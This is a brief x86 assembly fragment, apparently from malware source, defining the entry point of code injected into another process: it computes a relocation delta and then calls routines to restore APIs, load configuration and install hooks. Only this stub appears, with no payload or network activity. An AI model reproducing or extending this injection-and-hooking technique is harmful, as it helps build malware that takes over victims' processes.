
.code

;; ==================================================================================================== ;;
;; INJECTED_START - injected code entry point                                                           ;;
;; ==================================================================================================== ;;
INJECTED_START proc

	GetBaseDelta ebx

	invokx  &RestoreAPIs[ebx]

	invokx  &InitCfg[ebx]
	invokx  &InitArr[ebx]
	invokx  &InitHooks[ebx]

	ret
INJECTED_START endp

